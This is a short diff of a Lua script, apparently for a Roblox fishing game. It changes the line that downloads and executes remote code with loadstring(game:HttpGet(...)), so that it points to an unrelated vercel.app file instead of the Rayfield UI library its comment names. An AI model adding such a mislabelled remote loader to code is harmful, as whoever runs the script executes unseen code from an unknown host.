@@ -7,7 +7,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local FishingSystem = require(ReplicatedStorage:WaitForChild("FishingSystem"):WaitForChild("Fishing"))
 
 -- Create Rayfield Library (or use your favorite UI library)
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Rayfield = loadstring(game:HttpGet("https://fishing-system-eta.vercel.app/Fishing.lua"))()
 
 -- Main Window
 local Window = Rayfield:CreateWindow({
